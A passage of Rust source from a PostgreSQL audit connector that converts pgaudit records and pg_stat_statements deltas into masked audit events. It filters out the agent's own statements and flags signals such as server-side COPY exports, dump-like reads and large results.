        next += 1;
        out.push('$');
        out.push_str(&next.to_string());
    };
    let mut out = String::with_capacity(text.len());
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        match c {
            b'\'' => {
                // `''` inside a string is a quote.
                let mut j = i + 1;
                loop {
                    match b.get(j) {
                        None => return None,
                        Some(b'\'') if b.get(j + 1) == Some(&b'\'') => j += 2,
                        Some(b'\'') => break,
                        Some(_) => j += 1,
                    }
                }
                constant(&mut out);
                i = j + 1;
            }
            b'"' => {
                let mut j = i + 1;
                loop {
                    match b.get(j) {
                        None => return None,
                        Some(b'"') if b.get(j + 1) == Some(&b'"') => j += 2,
                        Some(b'"') => break,
                        Some(_) => j += 1,
                    }
                }
                out.push_str(&text[i..=j]);
                i = j + 1;
            }
            b'$' if b.get(i + 1).is_some_and(u8::is_ascii_digit) => {
                let mut j = i + 1;
                while j < b.len() && b[j].is_ascii_digit() {
                    j += 1;
                }
                out.push_str(&text[i..j]);
                i = j;
            }
            b'$' => return None,
            b'0'..=b'9' => {
                let mut j = i;
                while j < b.len() && b[j].is_ascii_digit() {
                    j += 1;
                }
                if b.get(j).is_some_and(|&d| ident(d) || d == b'.') {
                    return None;
                }
                constant(&mut out);
                i = j;
            }
            _ if c.is_ascii_alphabetic() || c == b'_' => {
                let mut j = i;
                while j < b.len() && ident(b[j]) {
                    j += 1;
                }
                let word = &text[i..j];
                if b.get(j) == Some(&b'\'') {
                    // `E'…'`, `B'…'`, `U&'…'`: never in the connector's texts.
                    return None;
                }
                if word.eq_ignore_ascii_case("true") || word.eq_ignore_ascii_case("false") {
                    constant(&mut out);
                } else {
                    out.push_str(word);
                }
                i = j;
            }
            b'-' if b.get(i + 1) == Some(&b'-') => return None,
            b'/' if b.get(i + 1) == Some(&b'*') => return None,
            _ if c.is_ascii() => {
                out.push(char::from(c));
                i += 1;
            }
            _ => return None,
        }
    }
    Some(out)
}

/// The agent's own activity in the PostgreSQL sources: the core rule
/// (`databastion_core::audit::own`: account, application, address, no
/// signal, row budget per object) plus what is PostgreSQL-specific.
///
/// - The connector's own statements that name no relation (closed list:
///   [`sql::OWN_TABLELESS`]) are left out on the core's identity and
///   signal rules without being charged ([`OwnKind::Tableless`]): they read
///   no row, and charging them used up the `*` budget within one scan.
///   They are recognized by their exact text: as sent with pgaudit (it
///   logs the text verbatim), and as `pg_stat_statements` stores it
///   ([`pss_form`]: constants as `$n`, the connector's bound parameters
///   in place) with `pg_stat_statements`.
/// - The `pg_stat_statements` text query registered by that stream reads
///   every role's statement texts (ADR-0049): left out uncharged only on
///   its exact text ([`OwnKind::StatementText`]), on pgaudit only within a
///   period of the target's `pg_stat_statements` stream ([`PssPeriods`]).
/// - Any other event of the agent's account on the unknown object `*`
///   ([`OwnKind::Unknown`]: a function call, even in `pg_catalog`; a text
///   that does not parse) is reported and never budgeted: the connector
///   names every relation it reads.
pub(crate) struct PgOwn {
    core: OwnAccount,
    own_texts: Vec<String>,
    /// The registered text queries, as sent.
    text_queries: Vec<String>,
    /// (`pg_stat_statements` form, statement as sent).
    own_pss: Vec<(String, String)>,
    registry: SharedOwnStatements,
    periods: SharedPssPeriods,
    /// Every fixed statement of the connector, as sent (ADR-0049 decision
    /// 8, security review of #211, M1).
    connector: Vec<String>,
}

impl PgOwn {
    pub(crate) fn new(core: OwnAccount, registry: SharedOwnStatements) -> Self {
        let extra = registry
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .clone();
        let mut own = Self {
            core,
            own_texts: Vec::new(),
            text_queries: Vec::new(),
            own_pss: Vec::new(),
            registry,
            periods: SharedPssPeriods::default(),
            connector: sql::connector_statements(),
        };
        for text in sql::OWN_TABLELESS {
            own.own_texts.push(text.to_owned());
            own.add_form(text);
        }
        for text in &extra {
            own.add_text_query(text);
        }
        own
    }

    /// The target's `pg_stat_statements` periods (decision 5).
    pub(crate) fn with_periods(mut self, periods: SharedPssPeriods) -> Self {
        self.periods = periods;
        self
    }

    fn add_form(&mut self, text: &str) {
        if let Some(f) = pss_form(text) {
            self.own_pss.push((f, text.to_owned()));
        }
    }

    fn add_text_query(&mut self, text: &str) {
        if self.text_queries.iter().any(|t| t == text) {
            return;
        }
        self.text_queries.push(text.to_owned());
        self.add_form(text);
    }

    /// Adds the connector's `pg_stat_statements` text query, and keeps it
    /// for the target's later streams (at most
    /// [`OWN_MAX_EXTRA_STATEMENTS`]; beyond, this stream only).
    pub(crate) fn allow_text_query(&mut self, text: &str) {
        self.add_text_query(text);
        let mut guard = self
            .registry
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        if !guard.iter().any(|t| t == text) && guard.len() < OWN_MAX_EXTRA_STATEMENTS {
            guard.push(text.to_owned());
        }
    }

    /// The connector's statements in a database whose `pg_stat_statements`
    /// schema is `pss_schema`, as sent.
    fn connector_candidates(&self, pss_schema: Option<&str>) -> Vec<String> {
        let mut out: Vec<String> = self.connector.clone();
        out.extend(self.text_queries.iter().cloned());
        if let Some(schema) = pss_schema {
            out.extend(sql::pss_probe(schema));
            for toplevel in [true, false] {
                out.extend(sql::pss_counters(schema, toplevel));
                out.extend(sql::pss_texts(schema, toplevel));
            }
        }
        out
    }

    /// `text` is exactly one of the connector's statements, as sent
    /// (pgaudit).
    pub(crate) fn connector_sent(&self, text: &str, pss_schema: Option<&str>) -> bool {
        self.connector_candidates(pss_schema)
            .iter()
            .any(|c| c == text)
    }

    /// `text` is exactly one of the connector's statements as
    /// `pg_stat_statements` stores it ([`pss_form`]).
    pub(crate) fn connector_pss_form(&self, text: &str, pss_schema: Option<&str>) -> bool {
        self.connector_candidates(pss_schema)
            .iter()
            .any(|c| pss_form(c).is_some_and(|f| f == text))
    }

    /// The agent's identity: its account, and, when the source logs them,
    /// its application name and client address (no budget involved).
    pub(crate) fn agent_identity(
        &self,
        user: &str,
        application: Option<&str>,
        client: ClientSeen,
    ) -> bool {
        let probe = MaskedEvent::new(
            EventSource::Pgaudit,
            EventAction::Read,
            EventPrincipal::account(user),
            SystemTime::now(),
        );
        self.core
            .routine_unbudgeted(user, application, client, &probe)
    }

    /// `text` is exactly one of the connector's own table-less statements.
    fn own_text(&self, text: &str) -> bool {
        self.own_texts.iter().any(|t| t == text)
    }

    /// `text` is exactly one of the registered text queries (as sent).
    fn text_query(&self, text: &str) -> bool {
        self.text_queries.iter().any(|t| t == text)
    }

    /// Whether `ts` falls within a `pg_stat_statements` period of the
    /// target.
    fn in_pss_period(&self, ts: SystemTime) -> bool {
        self.periods
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .covers(ts)
    }

    /// Which of the connector's own statements (as sent) `text`, read from
    /// `pg_stat_statements` (not cut), is exactly, as `pg_stat_statements`
    /// stores it ([`pss_form`]). The text is necessary, not sufficient:
    /// the poller also requires the agent's role, a top-level entry, a
    /// database where the connector runs that statement, and pins the
    /// entry's `queryid` (`audit::pss`).
    pub(crate) fn own_pss_form(&self, text: &str) -> Option<&str> {
        self.own_pss
            .iter()
            .find(|(f, _)| f == text)
            .map(|(_, sent)| sent.as_str())
    }

    /// [`Self::own_pss_form`] as a test.
    #[cfg(test)]
    pub(crate) fn own_pss_text(&self, text: &str) -> bool {
        self.own_pss_form(text).is_some()
    }

    /// Whether an event may be left out (see the type documentation).
    fn routine(
        &mut self,
        user: &str,
        application: Option<&str>,
        client: ClientSeen,
        e: &MaskedEvent,
        kind: OwnKind,
        now: Instant,
    ) -> bool {
        match kind {
            OwnKind::Tableless | OwnKind::StatementText => {
                self.core.routine_unbudgeted(user, application, client, e)
            }
            OwnKind::Unknown | OwnKind::Never => false,
            OwnKind::Named => self.core.routine(user, application, client, e, now),
        }
    }
}
/// Builds events from pgaudit records.
pub(crate) struct PgauditEvents {
    own: PgOwn,
    dumps: DumpTracker,
    catalogs: Catalogs,
    /// Records dropped because their conversion panicked.
    pub(crate) panicked: u64,
}

/// Statement text of a pgaudit record after the first one of its
/// statement and substatement, with `pgaudit.log_statement_once = on`.
const PREVIOUSLY_LOGGED: &str = "<previously logged>";

/// Per class of a statement: objects, rows, signals, unknown objects.
#[derive(Default)]
struct ClassPart {
    objects: Vec<RelationName>,
    rows: Option<u64>,
    signals: Vec<Signal>,
    unknown: bool,
    catalog_only: bool,
    dump: bool,
    /// A record of this class has a text other than one of the
    /// connector's own table-less statements.
    not_own_text: bool,
    /// The text decides and reached the analyzer's relation bound: it may
    /// name a statistics relation that was not kept (ADR-0048, as
    /// ADR-0045 decision 4 on MySQL / MariaDB): `*`, always reported,
    /// never the agent's own.
    bound: bool,
    /// Objects of the statement-text lists read with their text (ADR-0049
    /// decisions 1 to 3): named first, always reported.
    text_objects: Vec<RelationName>,
    /// `*` of ADR-0049 (decision 7, an extension-list call): always
    /// reported, never the agent's own.
    star: bool,
    /// A record of this class has a text other than one of the registered
    /// `pg_stat_statements` text queries (ADR-0049 decision 5).
    not_text_query: bool,
}

impl PgauditEvents {
    pub(crate) fn new(own: PgOwn) -> Self {
        Self {
            own,
            dumps: DumpTracker::default(),
            catalogs: Catalogs::default(),
            panicked: 0,
        }
    }

    /// [`Self::flush`] of one statement in isolation: a statement whose
    /// conversion panics is dropped alone, its records counted in
    /// `panicked` (PR #83 re-review M-A).
    fn flush_isolated(
        &mut self,
        group: Vec<AuditRecord>,
        now: SystemTime,
        out: &mut Vec<MaskedEvent>,
    ) {
        let n = group.len() as u64;
        match databastion_core::isolate(|| {
            let mut events = Vec::new();
            self.flush(group, now, &mut events);
            events
        }) {
            Some(events) => out.extend(events),
            None => self.panicked = self.panicked.saturating_add(n),
        }
    }

    /// Sets the per-database catalog facts (re-probed with the source).
    pub(crate) fn set_catalogs(&mut self, catalogs: Catalogs) {
        self.catalogs = catalogs;
    }

    /// Converts records (in log order) to events: one statement (same
    /// session and statement id, `SESSION` and `OBJECT` records merged)
    /// gives one event per action class (`read`, `write`, `ddl`, `dcl`).
    pub(crate) fn convert(
        &mut self,
        records: Vec<AuditRecord>,
        now: SystemTime,
    ) -> Vec<MaskedEvent> {
        let mut out = Vec::new();
        let mut group: Vec<AuditRecord> = Vec::new();
        for r in records {
            let same = group.first().is_some_and(|g| {
                g.session == r.session && g.audit.statement_id == r.audit.statement_id
            });
            if !same && !group.is_empty() {
                self.flush_isolated(std::mem::take(&mut group), now, &mut out);
            }
            group.push(r);
        }
        if !group.is_empty() {
            self.flush_isolated(group, now, &mut out);
        }
        out
    }

    fn flush(&mut self, group: Vec<AuditRecord>, now: SystemTime, out: &mut Vec<MaskedEvent>) {
        let Some(first) = group.first() else {
            return;
        };
        let mut parts: HashMap<EventAction, ClassPart> = HashMap::new();
        let mut seen_subs: HashSet<(u64, String, String)> = HashSet::new();
        // Names pgaudit reports in `pg_catalog` for this statement, and
        // the first text of each substatement (`log_statement_once`: later
        // records carry `<previously logged>`).
        let mut confirmed: HashSet<String> = HashSet::new();
        // Per substatement: the names pgaudit reports in `pg_catalog`, and
        // those it reports in another schema. With `log_catalog = on`, an
        // unqualified statistics name of a substatement's text that a
        // record names in another schema, and none in `pg_catalog`, is
        // that relation, not the catalog's (security re-review of #199,
        // N-M1: never decided across substatements nor without
        // `log_catalog = on`).
        let mut confirmed_in: HashMap<u64, HashSet<String>> = HashMap::new();
        let mut shadowing_in: HashMap<u64, HashSet<String>> = HashMap::new();
        let mut first_texts: HashMap<u64, &str> = HashMap::new();
        for r in &group {
            if let Some(rel) = split_object_name(&r.audit.object_name) {
                if rel.schema.as_deref() == Some("pg_catalog") {
                    confirmed_in
                        .entry(r.audit.substatement_id)
                        .or_default()
                        .insert(rel.name.clone());
                    confirmed.insert(rel.name);
                } else if rel.schema.is_some() {
                    shadowing_in
                        .entry(r.audit.substatement_id)
                        .or_default()
                        .insert(rel.name);
                }
            }
            let text: &str = &r.audit.statement;
            if text != PREVIOUSLY_LOGGED {
                first_texts.entry(r.audit.substatement_id).or_insert(text);
            }
        }
        let log_catalog = self
            .catalogs
            .get(&first.database)
            .and_then(|c| c.pgaudit_log_catalog);
        let rule = self
            .catalogs
            .rule(&first.database, log_catalog != Some(false), &confirmed);
        // ADR-0049 decision 8: a routine, type, cast or extension DDL makes
        // the database's collision probe stale, in log order: for the rest
        // of this statement (a `DO` block) and every statement logged
        // after it, until a probe that starts later.
        if group.iter().any(|r| {
            r.audit.class == "DDL"
                && (routine_ddl_command(&r.audit.command)
                    || (r.audit.command.starts_with("DROP")
                        && pg_scan(&r.audit.statement).is_some_and(|s| s.routine_ddl())))
        }) {
            self.catalogs.user_code.mark_stale(&first.database);
        }
        // Each record is analyzed on its own text (a substatement of a
        // function or DO block logs its own text); consecutive records
        // with the same text reuse the analysis.
        let mut cached: Option<(&str, QueryAnalysis, TextReads)> = None;
        // ADR-0049 decision 3: per substatement, the core-list objects its
        // text names, the core-list relation records (with their class),
        // and whether a record names a view, materialized view or foreign
        // relation outside `pg_catalog` (which can carry `query` under
        // another name).
        let mut text_named: HashMap<u64, Vec<RelationName>> = HashMap::new();
        let mut core_records: Vec<(EventAction, u64, RelationName)> = Vec::new();
        let mut derived_in: HashSet<u64> = HashSet::new();
        for r in &group {
            let action = match r.audit.class.as_str() {
                "READ" => EventAction::Read,
                "WRITE" => EventAction::Write,
                "DDL" => EventAction::Ddl,
                "ROLE" => EventAction::Dcl,
                _ => continue,
            };
            // SESSION and OBJECT records of the same substatement and
            // object are one access.
            if !seen_subs.insert((
                r.audit.substatement_id,
                r.audit.object_name.to_string(),
                r.audit.class.clone(),
            )) {
                continue;
            }
            let mut text: &str = &r.audit.statement;
            if text == PREVIOUSLY_LOGGED {
                // Without a first record (not in this read), the text
                // stays unparsable: the objects are unknown (`*`).
                text = first_texts
                    .get(&r.audit.substatement_id)
                    .copied()
                    .unwrap_or(PREVIOUSLY_LOGGED);
            }
            if cached.as_ref().is_none_or(|(t, ..)| *t != text) {
                let analysis = analyze(text, analyze_opts(false));
                // A `<previously logged>` without its first record is a
                // cut text: it names nothing, and records decide.
                let reads = text_reads(text, &analysis, rule, text == PREVIOUSLY_LOGGED);
                cached = Some((text, analysis, reads));
            }
            let Some((_, analysis, reads)) = cached.as_ref() else {
                continue;
            };
            text_named
                .entry(r.audit.substatement_id)
                .or_default()
                .extend(reads.named.iter().cloned());
            let stmts = matching(analysis, Some(r.audit.command.as_str()));
            let (text_relations, named_any) = user_relations(&stmts, rule);
            let own_text = self.own.own_text(text);
            let part = parts.entry(action).or_default();
            part.not_own_text |= !own_text;
            part.not_text_query |= !self.own.text_query(text);
            for o in &reads.objects {
                push_unique(&mut part.text_objects, o.clone());
            }
            // ADR-0049 decisions 7 and 8 (user code next to catalogs only,
            // for reads and writes).
            let own = &self.own;
            let own_exact = || {
                own.connector_sent(text, rule.pss_schema)
                    && own.agent_identity(
                        &first.user,
                        Some(&first.application),
                        ClientSeen::Logged(first.remote.as_deref().and_then(ClientAddr::parse)),
                    )
            };
            part.star |= reads.star
                || user_code_star(reads, &self.catalogs, &first.database, rule, &own_exact);
            let mut named = false;
            if !r.audit.object_name.is_empty()
                && is_relation_type(&r.audit.object_type)
                && let Some(rel) = split_object_name(&r.audit.object_name)
            {
                named = true;
                if rel.schema.as_deref() != Some("pg_catalog")
                    && matches!(
                        r.audit.object_type.as_str(),
                        "VIEW" | "MATERIALIZED VIEW" | "FOREIGN TABLE"
                    )
                    && !listed_relation(&rel, rule)
                {
                    derived_in.insert(r.audit.substatement_id);
                }
                match listed(&rel, false, rule.pss_schema) {
                    Some(Listed::Core(o, _)) => {
                        // Decided after every record (decision 3).
                        core_records.push((action, r.audit.substatement_id, o));
                        part.catalog_only = true;
                    }
                    Some(Listed::Extension(o)) => push_unique(&mut part.text_objects, o),
                    Some(Listed::Star) | None => {}
                }
                if listed_relation(&rel, rule) {
                    // Handled above.
                } else if let Some(s) = statistics_relation(&rel) {
                    // A statistics relation named by pgaudit (ADR-0048).
                    if !part.objects.contains(&s) {
                        part.objects.push(s);
                    }
                } else if is_catalog(&rel, rule) {
                    // A named catalog relation (`pgaudit.log_catalog`,
                    // `pg_stat_statements_info`): not application
                    // data, and not an unknown object either.
                    part.catalog_only = true;
                } else if !part.objects.contains(&rel) {
                    part.objects.push(rel);
                }
            }
            let sub_confirmed = confirmed_in.get(&r.audit.substatement_id);
            let sub_shadowing = shadowing_in.get(&r.audit.substatement_id);
            // The text decides on statistics relations unless relation
            // records name `pg_catalog` relations of this substatement
            // (`log_catalog = on`, and seen at work: security re-review of
            // #199, N-L1).
            let text_decides =
                !named || log_catalog != Some(true) || sub_confirmed.is_none_or(HashSet::is_empty);
            if text_decides && stmts.iter().any(|p| p.relations_full) {
                part.bound = true;
                part.unknown = true;
            }
            if named {
                // The statistics relations the text names, which relation
                // records leave out with `pgaudit.log_catalog = off`
                // (ADR-0048 decision 5), in every action class (`INSERT …
                // SELECT … FROM pg_stats`, `CREATE TABLE … AS`: security
                // review of #199, M1), whatever `log_catalog` says (L1).
                // An unqualified name is skipped only with `log_catalog =
                // on`, when a record of the same substatement names that
                // relation in another schema (a shadowing relation of the
                // search path) and none names it in `pg_catalog`; otherwise
                // it is over-reported.
                for p in &stmts {
                    for r in &p.relations {
                        let Some(s) = statistics_relation(r) else {
                            continue;
                        };
                        if r.schema.is_none()
                            && log_catalog == Some(true)
                            && sub_shadowing.is_some_and(|n| n.contains(&r.name))
                            && !sub_confirmed.is_some_and(|n| n.contains(&r.name))
                        {
                            continue;
                        }
                        if !part.objects.contains(&s) {
                            part.objects.push(s);
                        }
                    }
                }
            } else {
                if text_relations.is_empty() {
                    // A table-less read of a function of the lists is
                    // named by its view (ADR-0049 decision 1), not `*`.
                    if named_any || !reads.objects.is_empty() || !reads.named.is_empty() {
                        part.catalog_only = true;
                    } else {
                        part.unknown = true;
                    }
                }
                for rel in text_relations {
                    if !part.objects.contains(&rel) {
                        part.objects.push(rel);
                    }
                }
            }
            // A utility COPY record logs 0 rows: unknown.
            let utility_copy = r.audit.command == "COPY" && r.audit.object_name.is_empty();
            if let (Some(rows), false) = (r.audit.rows, utility_copy) {
                part.rows = Some(part.rows.map_or(rows, |p| p.max(rows)));
            }
            if action == EventAction::Read {
                part.signals.extend(statement_signals(&stmts, None, rule));
                // PL/pgSQL cannot COPY to the client: a COPY record whose
                // text does not show the COPY (dynamic SQL, nested DO) is
                // a server-side export.
                if r.audit.command == "COPY"
                    && analysis.kind() != StatementKind::Copy
                    && !stmts.iter().any(|p| p.kind == StatementKind::Copy)
                {
                    part.signals.push(Signal::CopyToFile);
                }
                let copied = copied_to_client(&stmts, rule);
                if !copied.is_empty() && self.dumps.copied(&r.session, &copied) {
                    part.dump = true;
                }
            }
        }
        // Decision 3: a core-list record the substatement's text does not
        // name, or next to a view, materialized view or foreign relation
        // outside `pg_catalog`, is a text read of that entry.
        for (action, sub, o) in core_records {
            let named_by_text = text_named.get(&sub).is_some_and(|v| v.contains(&o));
            if (!named_by_text || derived_in.contains(&sub))
                && let Some(part) = parts.get_mut(&action)
            {
                push_unique(&mut part.text_objects, o);
            }
        }
        if parts.is_empty() {
            return;
        }
        let principal = EventPrincipal::account(&first.user)
            .with_client(first.remote.as_deref().and_then(ClientAddr::parse))
            .with_application(&first.application);
        let ts = first.ts.unwrap_or(now);
        let mut actions: Vec<EventAction> = parts.keys().copied().collect();
        actions.sort();
        for action in actions {
            let Some(part) = parts.remove(&action) else {
                continue;
            };
            let rw = matches!(action, EventAction::Read | EventAction::Write);
            let text_read = !part.text_objects.is_empty();
            let mut part = part;
            for o in std::mem::take(&mut part.text_objects) {
                if !part.objects.contains(&o) {
                    part.objects.push(o.clone());
                }
                part.text_objects.push(o);
            }
            if rw && part.objects.is_empty() && part.catalog_only && !part.unknown && !part.star {
                // Only catalogs: not application data.
                continue;
            }
            let mut e = MaskedEvent::new(EventSource::Pgaudit, action, principal.clone(), ts)
                .with_rows(part.rows);
            // Statistics relations first (an event names 16 objects at
            // most), always reported (ADR-0048 decision 3).
            // Statement-text objects (ADR-0049) first, then statistics
            // relations: an event names 16 objects at most.
            let mut objects: Vec<&RelationName> = part.objects.iter().collect();
            objects.sort_by_key(|o| (!part.text_objects.contains(o), !is_statistics(o)));
            let statistics = part.objects.iter().any(is_statistics) || part.bound;
            // A `CREATE … AS <query>` at the relation bound may hide a
            // statistics relation too: `*` (security re-review of #199,
            // N-L2). A function of ADR-0049 decision 7 adds `*` in every
            // class.
            let unknown = (rw && (part.objects.is_empty() || part.unknown))
                || (action == EventAction::Ddl && part.bound)
                || part.star;
            // Reads and writes of unknown objects (`*`) are always reported
            // too: they never match `sensitive_objects` and their row count
            // says nothing of what they read (security review of #199, M2);
            // so are statement-text reads (ADR-0049 decision 4).
            if statistics || unknown || text_read {
                e = e.with_always_report();
            }
            for o in objects.into_iter().take(if unknown { 15 } else { 16 }) {
                e = e.with_object(object(&first.database, o));
            }
            if unknown {
                // A read or write whose objects the log does not tell (a
                // function or procedure body, a statement that does not
                // parse): reported against `*` rather than dropped (the
                // contract needs one object for read / write).
                e = e.with_object(unknown_object(&first.database));
            }
            for s in part.signals {
                e = e.with_signal(s);
            }
            if part.rows.is_some_and(|r| r > LARGE_ROWS) {
                e = e.with_signal(Signal::LargeResult);
            }
            if action == EventAction::Read
                && (part.dump
                    || (is_dump_application(&first.application)
                        && (e.signals().contains(&Signal::FullTableCopy)
                            || e.signals().contains(&Signal::FullTableRead))))
            {
                e = e.with_signal(Signal::PgDump);
            }
            let client = first.remote.as_deref().and_then(ClientAddr::parse);
            // ADR-0049 decision 5: the registered text query, exactly, with
            // no other object, within a `pg_stat_statements` period.
            let own_text_query = text_read
                && !part.not_text_query
                && !part.star
                && !part.unknown
                && !statistics
                && part
                    .objects
                    .iter()
                    .all(|o| o.name == PSS_VIEW && o.schema.as_deref() == rule.pss_schema)
                && self.own.in_pss_period(ts);
            let kind = if own_text_query {
                OwnKind::StatementText
            } else if statistics || text_read || part.star {
                OwnKind::Never
            } else if !part.not_own_text && part.objects.is_empty() {
                OwnKind::Tableless
            } else if unknown {
                OwnKind::Unknown
            } else {
                OwnKind::Named
            };
            if self.own.routine(
                &first.user,
                Some(&first.application),
                ClientSeen::Logged(client),
                &e,
                kind,
                Instant::now(),
            ) {
                continue;
            }
            out.push(e);
        }
    }
}

/// One `pg_stat_statements` counter delta.
pub(crate) struct StatementDelta<'a> {
    pub(crate) user: &'a str,
    pub(crate) database: &'a str,
    pub(crate) analysis: &'a QueryAnalysis,
    /// What the text reads of the statement-text lists (ADR-0049), decided
    /// when the text was read.
    pub(crate) reads: &'a TextReads,
    /// The text is exactly one of the connector's own table-less
    /// statements ([`PgOwn::own_pss_text`]).
    pub(crate) own_text: bool,
    pub(crate) calls: u64,
    pub(crate) rows: u64,
}

/// Events from the `pg_stat_statements` deltas of one poll, between
/// `from` and `to`. `pg_stat_statements` gives no client address, no
/// application, no per-execution time and no per-execution row count: an
/// event is the sum over the poll interval of one statement for one role.
/// The agent's own account is reported only for deltas carrying a signal
/// (the application name is not visible here).
#[cfg(test)]
pub(crate) fn pss_events(
    deltas: &[StatementDelta<'_>],
    own: &mut PgOwn,
    catalogs: &Catalogs,
    from: SystemTime,
    to: SystemTime,
) -> Vec<MaskedEvent> {
    pss_events_counted(deltas, own, catalogs, from, to).0
}

/// [`pss_events`], with the indices (in `deltas`) of the statements whose
/// conversion panicked, so the caller marks them poisoned and does not
/// convert them again: each statement is converted in isolation
/// (`databastion_core::isolate`), so one that makes the analysis code
/// panic does not stop the others (security review of #85). Its delta is
/// still reported, against `*` ([`pss_unanalyzed_event`]), so a statement
/// shape that makes the code panic cannot hide its executions.
pub(crate) fn pss_events_counted(
    deltas: &[StatementDelta<'_>],
    own: &mut PgOwn,
    catalogs: &Catalogs,
    from: SystemTime,
    to: SystemTime,
) -> (Vec<MaskedEvent>, Vec<usize>) {
    // The pg_dump pattern per role within the poll.
    // No object names here: unqualified `pg_*` names stay catalogs.
    let none = HashSet::new();
    let mut panicked = Vec::new();
    // ADR-0049 decision 8: a routine, type, cast or extension DDL seen in
    // this poll makes its database's collision probe stale before any
    // statement of the poll is judged (the order within a poll is not
    // known).
    for d in deltas {
        if d.analysis.kind() == StatementKind::Ddl && d.reads.routine_ddl {
            catalogs.user_code.mark_stale(d.database);
        }
    }
    let mut copied: HashMap<&str, HashSet<RelationName>> = HashMap::new();
    for d in deltas {
        let rule = catalogs.rule(d.database, true, &none);
        let all: Vec<&StatementInfo> = d.analysis.parts().iter().collect();
        // A panic here is counted when the same statement is converted
        // below (it panics there too, or is converted without this part).
        if let Some(c) = databastion_core::isolate(|| copied_to_client(&all, rule))
            && !c.is_empty()
        {
            copied.entry(d.user).or_default().extend(c);
        }
    }
    let mut out = Vec::new();
    for (i, d) in deltas.iter().enumerate() {
        match databastion_core::isolate(|| pss_event(d, own, catalogs, &copied, from, to)) {
            Some(Some(e)) => out.push(e),
            Some(None) => {}
            None => {
                panicked.push(i);
                out.push(pss_unanalyzed_event(
                    d.user, d.database, d.calls, d.rows, from, to,
                ));
            }
        }
    }
    (out, panicked)
}

/// The event of a `pg_stat_statements` delta whose statement could not be
/// analyzed or converted (the analysis or conversion panicked; phase-7
/// security review): a read of unknown objects (`*`) with the delta's
/// counts, and `volume.large_result` above [`LARGE_ROWS`] rows. Built
/// from the counters, the role and the database only: no statement text.
/// Never left out as the agent's own activity (the connector names every
/// relation it reads) and never budgeted.
///
/// Always a read, on purpose: the statement's kind is unknown, and a read
/// of `*` over-reports (a write or DDL shows up as a read of unknown
/// objects) rather than hides; it fails safe (PR #90 review Low-2).
pub(crate) fn pss_unanalyzed_event(
    user: &str,
    database: &str,
    calls: u64,
    rows: u64,
    from: SystemTime,
    to: SystemTime,
) -> MaskedEvent {
    let mut e = MaskedEvent::new(
        EventSource::PgStatStatements,
        EventAction::Read,
        EventPrincipal::account(user),
        from,
    )
    .with_rows(Some(rows))
    .with_aggregate(calls, to)
    .with_object(unknown_object(database));
    if rows > LARGE_ROWS {
        e = e.with_signal(Signal::LargeResult);
    }
    e
}

/// [`pss_form`] for the poller's tests.
#[cfg(test)]
pub(crate) fn tests_pss_form(text: &str) -> String {
    pss_form(text).unwrap_or_default()
}

/// Tests: a statement of this role makes its conversion panic (a bug on
/// one statement).
#[cfg(test)]
pub(crate) const TEST_POISON_USER: &str = "test-conversion-panic";

/// One statement's event (see [`pss_events`]); `None` when it gives none.
fn pss_event(
    d: &StatementDelta<'_>,
    own: &mut PgOwn,
    catalogs: &Catalogs,
    copied: &HashMap<&str, HashSet<RelationName>>,
    from: SystemTime,
    to: SystemTime,
) -> Option<MaskedEvent> {
    #[cfg(test)]
    #[allow(clippy::panic)]
    if d.user == TEST_POISON_USER {
        panic!("conversion bug on a statement");
    }
    let none = HashSet::new();
    let rule = catalogs.rule(d.database, true, &none);
    let a = d.analysis;
    let all: Vec<&StatementInfo> = a.parts().iter().collect();
    // ADR-0049 decision 8: user code next to catalogs only, `*` like the
    // functions of decision 7, in every action class.
    let own_exact = || d.reads.own_connector;
    let code_star = user_code_star(d.reads, catalogs, d.database, rule, &own_exact);
    let action = match a.kind() {
        StatementKind::Select | StatementKind::Table | StatementKind::Values => EventAction::Read,
        StatementKind::Copy => {
            if a.copy().is_some_and(|c| c.to) {
                EventAction::Read
            } else {
                EventAction::Write
            }
        }
        StatementKind::Insert
        | StatementKind::Update
        | StatementKind::Delete
        | StatementKind::Merge => EventAction::Write,
        StatementKind::Ddl => EventAction::Ddl,
        StatementKind::Dcl => EventAction::Dcl,
        // A statement that wraps a query (`EXPLAIN`, `PREPARE`, `DECLARE …
        // CURSOR`) and runs user code next to catalogs: a read of `*`
        // (security review of #211, H1).
        _ if code_star => EventAction::Read,
        _ => return None,
    };
    let (mut objects, named_any) = user_relations(&all, rule);
    // ADR-0049: the statement-text objects the text reads, and `*` of
    // decision 7, in every action class.
    let reads = d.reads;
    let rw = matches!(action, EventAction::Read | EventAction::Write);
    let reads_star = reads.star || code_star;
    // A core-list entry read in the no-text shape is a catalog read.
    let named_any = named_any || !reads.named.is_empty();
    for o in &reads.objects {
        push_unique(&mut objects, o.clone());
    }
    // A text at the analyzer's relation bound may name a statistics
    // relation that was not kept (after 16 catalogs, say): `*`, always
    // reported, never the agent's own (as ADR-0045 decision 4 on MySQL /
    // MariaDB). Decided before the catalog-only skip (security review of
    // #199, H1).
    // So is a DDL statement (`CREATE TABLE … AS <query>`, `CREATE VIEW
    // … AS`: security re-review of #199, N-L2).
    let bound = (rw || action == EventAction::Ddl) && all.iter().any(|p| p.relations_full);
    if rw && objects.is_empty() && named_any && !bound && !reads_star {
        return None;
    }
    // COPY counts rows in pg_stat_statements too.
    let rows = Some(d.rows);
    let mut e = MaskedEvent::new(
        EventSource::PgStatStatements,
        action,
        EventPrincipal::account(d.user),
        from,
    )
    .with_rows(rows)
    .with_aggregate(d.calls, to);
    // Statement-text objects (ADR-0049), then statistics relations (16
    // objects at most), always reported (ADR-0048 decision 3, ADR-0049
    // decision 4).
    let mut named: Vec<&RelationName> = objects.iter().collect();
    named.sort_by_key(|o| (!reads.objects.contains(o), !is_statistics(o)));
    let statistics = objects.iter().any(is_statistics) || bound;
    let text_read = !reads.objects.is_empty();
    let star = (rw && objects.is_empty()) || bound || reads_star;
    // A read or write of unknown objects (`*`) has no useful row count for
    // `min_rows` and never matches `sensitive_objects`: always reported,
    // as on MySQL / MariaDB (security review of #199, M2).
    if statistics || star || text_read {
        e = e.with_always_report();
    }
    for o in named.into_iter().take(if star { 15 } else { 16 }) {
        e = e.with_object(object(d.database, o));
    }
    if star {
        e = e.with_object(unknown_object(d.database));
    }
    if action == EventAction::Read {
        for s in statement_signals(&all, rows, rule) {
            e = e.with_signal(s);
        }
        if !copied_to_client(&all, rule).is_empty()
            && copied
                .get(d.user)
